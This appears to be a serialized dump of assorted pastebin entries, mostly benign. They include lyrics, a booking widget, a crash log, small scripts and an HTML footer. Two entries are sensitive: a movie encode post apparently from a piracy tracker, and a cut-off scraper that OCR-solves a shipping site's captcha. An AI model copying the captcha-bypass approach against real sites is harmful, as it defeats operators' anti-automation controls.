SimplybookWidget({""widget_type"":""iframe"",""url"":""https:\\/\\/faszienbodensee.simplybook.it"",""theme"":""minimal"",""theme_settings"":{""timeline_show_end_time"":""1"",""timeline_modern_display"":""as_slots"",""hide_company_label"":""1"",""timeline_hide_unavailable"":""1"",""hide_past_days"":""1"",""sb_base_color"":""#97c9c1"",""btn_color_1"":""#97c9c1,#97c9c1,#97c9c1"",""link_color"":""#392f5a"",""display_item_mode"":""block"",""body_bg_color"":""#FEF9EC"",""sb_review_image"":"""",""dark_font_color"":""#595959"",""light_font_color"":""#ffffff"",""sb_company_label_color"":""#392f5a"",""hide_img_mode"":""1"",""sb_busy"":""#aaa6aa"",""sb_available"":""#2b212b""},""timeline"":""modern"",""datepicker"":""top_calendar"",""is_rtl"":false,""app_config"":{""allow_switch_to_ada"":0,""predefined"":[]}});\n});\n</script>[/borlabs-cookie]', date='2022-06-01 11:29:11 +00:00', hash_val='f36d24fffe9fce5a45ef6a87f5bd1865', url='/Eb9uukQC', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='datafile', title='Matchanah 2  Matchanah 2 - Híu, Bâu  | HoatHinh.tv | J0ee4ofk5pDi', content='Lời bài hát Matchanah 2 \xa0Matchanah 2 - Híu, Bâu \xa0| HoatHinh.tv | J0ee4ofk5pDi Lyrics up by vnflix.com Không thích cảm giác phải nhớ mong \nRồi lại yêu thêm một ai\nNhưng mà vì em mà con tim anh lại thêm một nhịp sai\ncảm giác nhớ mong \nchiều nhẹ nhàng \nBuông xuống đôi hàng mi \nlà vì em đó \nmà lòng vội vàng \nThôi nói ra làm chi\nlà vì em đó \nBaby tell me what your name \nVội vàng xin số \nXin thêm cuộc hẹn \nNgay trong đêm\nSay la la la la \nLa la la la\nBao câu ca\ntặng em cùng đoá hoa\n\xa0\nvì em là matcha machiato \nMang yêu thương này đi vội \nem là matcha machiato \nThương sao chẳng nói nên lời\n\xa0\nlà matcha machiato \nĐem câu ca này buông lời \nAh ha ha ha \n\xa0\nvừa đắm vừa say \nEm làm con tim bối rối ở đây \nlời nói vừa trao \nEm mà đồng ý thì hay qá rồi sao \nnếu như mình có \nvài tình ý \nthì cứ nói cùng nhau \n\xa0\nĐừng chỉ ghé đưa nhẹ ánh mắt \nMà hãy kèm theo nó là một lời chào\n\xa0\nGiờ anh lại thích \nphải ngóng trông \nRồi lại rơi vào tình yêu \nChẳng cần biết là bao lâu \nHay là\nNơi nào mình yêu \n\xa0\ncảm giác nhớ mong \nchiều nhẹ nhàng \nBuông xuống đôi hàng mi \nlà vì em đó \nmà lòng vội vàng \nThôi nói ra làm chi\n\xa0\nlà vì em đó \nBaby tell me what your name \nVội vàng xin số \nXin thêm cuộc hẹn \nNgay trong đêm\nSay la la la la \nLa la la la\nBao câu ca\ntặng em cùng đoá hoa\n\xa0\nvì em là matcha machiato \nMang yêu thương này đi vội \nlà matcha machiato \nThương sao chẳng nói nên lời\n\xa0\nlà matcha machiato \nĐem câu ca này buông lời \nAh ha ha ha', date='2022-06-01 11:00:40 +00:00', hash_val='9a5b551d9d04c21de2b9f2bb3bff79e9', url='/1c8LP5ed', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='trds', title='Untitled', content="[size=3][b]The Northman [/b][/size]\n\xa0\n[size=2][b][u]Technical information[/u][/b][/size]\n[font=Courier New]RUNTIME.......:[/font] 2 h 16 min\n[font=Courier New]SIZE..........:[/font] 17.8 GiB\n[font=Courier New]VIDEO CODEC...:[/font] x264, CRF, L4.1\n[font=Courier New]FRAMERATE.....:[/font] 23.976\n[font=Courier New]BITRATE.......:[/font] 16.9 Mb/s\n[font=Courier New]RESOLUTION....:[/font] 1920x960 pixels\n[font=Courier New]AUDIO1........:[/font] English DD+7.1 at 1 536 kb/s \xa0\n[font=Courier New]AUDIO2........:[/font] English DD2.0 at 192 kb/s - Commentary by director/co-writer Robert Eggers \n[font=Courier New]SUBTITLES.....:[/font] English Forced, English, English SDH, Romanian, French, Spanish\n[font=Courier New]CHAPTERS......:[/font] Yes\n[font=Courier New]SOURCE1.......:[/font] The Northman 2022 1080p Blu-ray AVC TrueHD 7.1-MTeam \n[font=Courier New]SOURCE2.......:[/font] The Northman 2022 REPACK 2160p WEB-DL DD+5.1 HEVC-MZABI\n[font=Courier New]ENCODER.......:[/font] Cristi\n[font=Courier New]NOTES.........:[/font] Blu-ray disc a lil' bit superior to WEB-DL 2160p SDR.\nUsed the WEB-DL just to replace hardcoded subs from disc (check #5 set of comparisons).\nReplaceFramesSimple & z_ConvertFormat were used.\n\xa0\n[quote]x264 [info]: frame I:957 \xa0 Avg QP:12.22 \xa0size:125053\nx264 [info]: frame P:39464 Avg QP:14.12 \xa0size: 66372\nx264 [info]: frame B:156507 Avg QP:15.51 \xa0size: 37690\nx264 [info]: consecutive B-frames: \xa01.0% \xa01.9% \xa06.8% 15.4% 15.3% 45.7% \xa06.3% \xa02.9% \xa02.6% \xa02.1%[/quote]\n[center] \n\xa0\n[size=2][b]Source|luvBB|WEB-DL|MTeam[/b][/size]\n[url=https://img.hdbits.org/UHHxNjp][img]https://t.hdbits.org/UHHxNjp.jpg[/img][/url] [url=https://img.hdbits.org/LVFUVMU][img]https://t.hdbits.org/LVFUVMU.jpg[/img][/url] [url=https://img.hdbits.org/96BBVLC][img]https://t.hdbits.org/96BBVLC.jpg[/img][/url] [url=https://img.hdbits.org/seOdtbK][img]https://t.hdbits.org/seOdtbK.jpg[/img][/url] \n[url=https://img.hdbits.org/HOiZeQi][img]https://t.hdbits.org/HOiZeQi.jpg[/img][/url] [url=https://img.hdbits.org/EC2QijE][img]https://t.hdbits.org/EC2QijE.jpg[/img][/url] [url=https://img.hdbits.org/WUCV0K2][img]https://t.hdbits.org/WUCV0K2.jpg[/img][/url] [url=https://img.hdbits.org/NJq7PG8][img]https://t.hdbits.org/NJq7PG8.jpg[/img][/url] \n[url=https://img.hdbits.org/FxHCWCt][img]https://t.hdbits.org/FxHCWCt.jpg[/img][/url] [url=https://img.hdbits.org/uYkxG8Y][img]https://t.hdbits.org/uYkxG8Y.jpg[/img][/url] [url=https://img.hdbits.org/u7oruTm][img]https://t.hdbits.org/u7oruTm.jpg[/img][/url] [url=https://img.hdbits.org/FmhiiI3][img]https://t.hdbits.org/FmhiiI3.jpg[/img][/url] \n[url=https://img.hdbits.org/r5SypKm][img]https://t.hdbits.org/r5SypKm.jpg[/img][/url] [url=https://img.hdbits.org/0a9i7jA][img]https://t.hdbits.org/0a9i7jA.jpg[/img][/url] [url=https://img.hdbits.org/QUrKSzU][img]https://t.hdbits.org/QUrKSzU.jpg[/img][/url] [url=https://img.hdbits.org/tmcL4HF][img]https://t.hdbits.org/tmcL4HF.jpg[/img][/url] \n[url=https://img.hdbits.org/f4PpeiV][img]https://t.hdbits.org/f4PpeiV.jpg[/img][/url] [url=https://img.hdbits.org/bbmvF3A][img]https://t.hdbits.org/bbmvF3A.jpg[/img][/url] [url=https://img.hdbits.org/2Q2l3kO][img]https://t.hdbits.org/2Q2l3kO.jpg[/img][/url] [url=https://img.hdbits.org/VQn8jFw][img]https://t.hdbits.org/VQn8jFw.jpg[/img][/url] \n[url=https://img.hdbits.org/FbmuxhR][img]https://t.hdbits.org/FbmuxhR.jpg[/img][/url] [url=https://img.hdbits.org/SNx5tcu][img]https://t.hdbits.org/SNx5tcu.jpg[/img][/url] [url=https://img.hdbits.org/X9GsMW3][img]https://t.hdbits.org/X9GsMW3.jpg[/img][/url] [url=https://img.hdbits.org/aCK1AZo][img]https://t.hdbits.org/aCK1AZo.jpg[/img][/url][/center]", date='2022-06-01 10:56:06 +00:00', hash_val='b19171be9f47eb161a06b028120ca80e', url='/265imbAB', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='NikolayBezay', title='Carpetshop embed for GTM Total page price.', content="<script>\n(function() {\n\xa0 \xa0 function setTotalPrice() {\n\xa0 \xa0 \xa0 \xa0 var cartPrice, cartPriceContainer = document.querySelector('div[data-subtotal].ajaxcart__subtotal');\n\xa0 \xa0 \xa0 \xa0 if (cartPriceContainer) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 cartPrice = cartPriceContainer.textContent.replace('₪','').replace(',','').trim();\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 var checkoutPrice, checkoutPriceContainer = document.querySelector('.payment-due__price');\n\xa0 \xa0 \xa0 \xa0 if (checkoutPriceContainer) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 checkoutPrice = checkoutPriceContainer.textContent.replace('₪','').replace(',','').trim();\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 if (cartPrice || checkoutPrice) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 var totalPagePrice = cartPrice ? parseInt(cartPrice) : parseInt(checkoutPrice);\n\xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 window.sessionStorage.setItem('adoricTotalPagePrice', totalPagePrice);\n\xa0 \xa0 \xa0 \xa0 } else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 window.sessionStorage.setItem('adoricTotalPagePrice', 0);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 let PAGE_BODY = document.querySelector('BODY');\n\xa0 \xa0 PAGE_BODY.addEventListener('click', setTotalPrice);\n\xa0 \xa0 PAGE_BODY.addEventListener('touchend', setTotalPrice);\n\xa0 \xa0 if (document.readyState === 'loading') {\n\xa0 \xa0 \xa0 \xa0 document.addEventListener('DOMContentLoaded', setTotalPrice);\n\xa0 \xa0 } else {\n\xa0 \xa0 \xa0 \xa0 setTotalPrice();\n\xa0 \xa0 }\n})();\n</script>", date='2022-06-01 10:53:03 +00:00', hash_val='e4ef8d93da57f0136b632fcdfcaa2b2c', url='/HmxfrnRy', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='DavudHaji', title='Json for AutoProfile (Example)', content='{\n\xa0 \xa0 ""id"": 1,\n\xa0 \xa0 ""enable"": true,\n\xa0 \xa0 ""branch_id"": 1,\n\xa0 \xa0 ""unversal_profile_id"": null,\n\xa0 \xa0 ""template_id"": 1,\n\xa0 \xa0 ""service_groups"": [\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""percent"": 40,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""group_id"": 1\n\xa0 \xa0 \xa0 \xa0 },\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"":2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""percent"": 60,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""group_id"": 2\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 ],\n\xa0 \xa0 ""allowed_profiles"":[\n\xa0 \xa0 \xa0 \xa0 1,\n\xa0 \xa0 \xa0 \xa0 2,\n\xa0 \xa0 \xa0 \xa0 3,\n\xa0 \xa0 \xa0 \xa0 5\n\xa0 \xa0 ],\n\xa0 \xa0 ""queue_profile"": [\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""id"": 1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""profile_id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ""queue_id"": 6\n\xa0 \xa0 \xa0 \xa0 },\n\xa0 \xa0 \xa0 \xa0 {\n\xa0 \xa0 \xa0 \xa0 \xa0""profile_id"":1,\n\xa0 \xa0 \xa0 \xa0 \xa0""queue_id"":5\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 ]\n}', date='2022-06-01 10:38:38 +00:00', hash_val='da7784ff281373d2619ac3c3ad0a8b56', url='/CtwGnkGJ', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='devil2010', title='Link crash', content='Build version: 1.8.6 \nBuild date: 1981-01-01 01:01:02 \nCurrent date: 2022-06-01 16:48:35 \nDevice: Samsung SM-G570Y \nOS version: Android 8.0.0 (SDK 26) \n\xa0\nStack trace: \xa0\njava.lang.RuntimeException: Unable to start activity ComponentInfo{com.civix.link/com.civix.link.Screen.NotificationClickScreen}: java.lang.IllegalStateException: Only fullscreen activities can request orientation\n\xa0 \xa0 at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2957)\n\xa0 \xa0 at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:3032)\n\xa0 \xa0 at android.app.ActivityThread.-wrap11(Unknown Source:0)\n\xa0 \xa0 at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1696)\n\xa0 \xa0 at android.os.Handler.dispatchMessage(Handler.java:105)\n\xa0 \xa0 at android.os.Looper.loop(Looper.java:164)\n\xa0 \xa0 at android.app.ActivityThread.main(ActivityThread.java:6942)\n\xa0 \xa0 at java.lang.reflect.Method.invoke(Native Method)\n\xa0 \xa0 at com.android.internal.os.Zygote$MethodAndArgsCaller.run(Zygote.java:327)\n\xa0 \xa0 at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1374)\nCaused by: java.lang.IllegalStateException: Only fullscreen activities can request orientation\n\xa0 \xa0 at android.os.Parcel.readException(Parcel.java:1975)\n\xa0 \xa0 at android.os.Parcel.readException(Parcel.java:1913)\n\xa0 \xa0 at android.app.IActivityManager$Stub$Proxy.setRequestedOrientation(IActivityManager.java:6224)\n\xa0 \xa0 at android.app.Activity.setRequestedOrientation(Activity.java:5840)\n\xa0 \xa0 at com.civix.link.Screen.NotificationClickScreen.onCreate(NotificationClickScreen.kt:30)\n\xa0 \xa0 at android.app.Activity.performCreate(Activity.java:7183)\n\xa0 \xa0 at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1221)\n\xa0 \xa0 at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2910)\n\xa0 \xa0 ... 9 more\n\xa0\nUser actions: \n2022-06-01 16:48:34: NotificationClickScreen created', date='2022-06-01 09:49:14 +00:00', hash_val='4bf4318a34bb14a9e37ed82cf1eb8e24', url='/RcUN0MQm', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='gogowgogo', title='Announcement Client Manager', content='local Frame = script.Parent.Frame\nlocal TextLabel = Frame.TextLabel\n\xa0\nwhile true do\nTextLabel.Text = ""Please Subscribe!""\nwait(10)\n\xa0 \xa0 TextLabel.Text = ""Please Like!""\n\xa0 \xa0 wait(10)\n\xa0 \xa0 end', date='2022-06-01 09:33:52 +00:00', hash_val='eebc145dac3fe06661b80d1669b1f2df', url='/Ne4dJZVF', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='datafile', title='Dance When You Cry  Dance When You Cry - Fiji Blue  | HoatHinh.tv | bzDUCUDSyyo2', content="Lời bài hát Dance When You Cry \xa0Dance When You Cry - Fiji Blue \xa0| HoatHinh.tv | bzDUCUDSyyo2 Lyrics up by vnflix.com [Verse 1]\nIt's alright\nThat you've been dancing alone the whole night\nYou get lost in the lows and the highs\nYou don't care if it shows\nSometimes (Sometimes)\nThere's a chance for hellos and goodbyes (Goodbyes)\nWhen there's nobody left It's alright\n'Cause you're fine on your own\n\xa0\n[Pre-Chorus]\nYou know you're not afraid\nWhen you're in your darkest place\n\xa0\n\xa0\n[Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in hiding those feelings inside of you\nIt's one of those nights, you dance when you cry\nThеre's no point in stopping\nWho cares if they'rе watching you, baby?\n\xa0\n[Post-Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n[Verse 2]\nIt's alright\nIf you don't answer the door sometimes\nYou leave your tears on the floor when you fly\nNo one knows how high you'll go\nNow that you're alone\n\xa0\n[Pre-Chorus]\nYou know you're not afraid\nWhen you're in your darkest place\n\xa0\n[Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in hiding those feelings inside of you\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n\xa0\n[Post-Chorus]\n(It's one of those of nights, it's one of those of nights)\n(It's one of those of nights, it's one of those of nights)\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n[Outro]\n(It's one of those of nights)\n(It's one of those of nights)", date='2022-06-01 09:25:11 +00:00', hash_val='e31208a173b7feed60da85dbf7fb1cfe', url='/QtqFRCg5', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='aldinokemal', title='Elearning - Footer', content='<div class=""c-footer-nav row text-sm-center text-md-left"">\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header"">Diskominfo Kabupaten Bantul</h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/hal/visi-dan-misi"">Visi dan Misi</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/news"" target=""_blank"">Berita</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/announcements"">Pengumuman</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header""><span>Hubungi Kami</span></h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""mailto:diskominfo@bantulkab.go.id"">Email: diskominfo@bantulkab.go.id</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://wa.me/6289685024091"">Whatsapp: 6289685024091</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""#"">Telepon: 0274367509</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/contact-us"">Selengkapnya</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header"">Lokasi</h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li><span style=""font-size: 0.85rem;"">Dinas Komunikasi dan Informatika Kabupaten Bantul Komplek Parasamya, Jl. RW Monginsidi Nomor 1 Bantul</span></li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n</div>', date='2022-06-01 09:08:27 +00:00', hash_val='192f6358341df3d57e55298a5d37d6c3', url='/C4b3ZKSG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='Paste Ping', content='PasteBin API Check', date='2022-06-01 09:01:22 +00:00', hash_val='e522a815c1ef8d8bb15910a6ed3f5b6c', url='/WDAvn4HM', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='fueradeservicio', title='n_tgt muestra dirección pero no el contenido', content='### Importamos las funciones que necesitamos ###\n\xa0\nimport os \xa0# Lo necesitamos para ping\n\xa0\n### Fin de importación funciones\n\xa0\n\xa0\n\xa0\n### Definimos \xa0variables ###\n\xa0\n### Fin definición de variables ###\n\xa0\n\xa0\n\xa0\n\xa0\n### Definimos las funciones\n\xa0\n#Mostramos el cartel\ndef presentacion():\n\xa0 \xa0 print()\n\xa0 \xa0 print()\n\xa0 \xa0 print(\' \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ########## PYDESK ##########\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\' ** SCRIPT QUE FACILITA ALGUNAS DE LAS ACCIONES MÁS HABITUALES EN EL SISTEMA ** \')\n\xa0 \xa0 print()\n\xa0\n\xa0\n#Mostramos el menú de eleccion\ndef menu_acciones():\n\xa0 \xa0 print()\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'1) HACER PING AL TERMINAL\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'2) POR DEFINIR...\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'3) POR DEFINIR...\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'4) SALIR\')\n\xa0 \xa0 print()\n\xa0 \xa0 opcion = input(""ELIGE UNA OPCIÓN: "")\n\xa0 \xa0 print(\'Esta es la opción elegida dentro de la funcion: \', opcion)\n\xa0 \xa0 return opcion\n\xa0\n\xa0\n#Funcion que elige la TGT\ndef n_tgt():\n\xa0 \xa0 tgt = input(\'Por favor, intoduce la TGT: \')\n\xa0 \xa0 print(\'Desde la funcion de n_tgt vemos la \xa0TGT elegida \', tgt)\n\xa0 \xa0 return tgt\n\xa0\n\xa0\n\xa0\n#Funcion que hace ping\ndef haz_ping_a(x):\n\xa0 \xa0 print(\'Estamos haciendo ping a \', x \xa0)\n\xa0 \xa0 return x\n\xa0\n\xa0\n\xa0\n\xa0\n\xa0\n\xa0\n### CUERPO ###\n\xa0\n#Llamamos a las funciones presentacion y menu_acciones\npresentacion()\nmenu_acciones()\nn_tgt()\nhaz_ping_a(n_tgt)', date='2022-06-01 08:57:18 +00:00', hash_val='39bcca476b285ca43c0d46f4c39865a0', url='/n3KceSd6', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Merevoli', title='Untitled', content='# -*- coding: utf-8 -*-\nimport io\nimport string\nfrom contextlib import suppress\n\xa0\nimport cv2\nimport dateutil.parser as dateparser\nfrom pp_scraper.mixins import CookieMixin\nimport numpy as np\nimport pytesseract\nfrom collections import deque\nimport math\nimport urllib3\nfrom PIL import Image, ImageEnhance\nfrom pp_scraper import activity_logger\nfrom pp_scraper.spiders.BaseScraper import BaseScraperItemPipeline\nfrom scrapy.http import Request, FormRequest\n\xa0\nRETSCN_BASE_URL = ""http://www.ets-express.com/admin.php/Home/Yanzhengma/index""\nRETSCN_TRACK_URL = ""http://www.ets-express.com/Home/Index/guiji.html""\n\xa0\nACCEPT_CHARS = string.ascii_letters + string.digits\n\xa0\n\xa0\ndef post_process_captcha(captcha: str) -> str:\n\xa0 \xa0 """"""\n \xa0 \xa0tesseract sometimes produces extra special characters (like ""\'"", ""-"")\n \xa0 \xa0and securimage seems to only generate alphanumeric character\n \xa0 \xa0""""""\n\xa0 \xa0 output = """"\n\xa0 \xa0 for c in captcha:\n\xa0 \xa0 \xa0 \xa0 if c in ACCEPT_CHARS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 output += c\n\xa0 \xa0 return 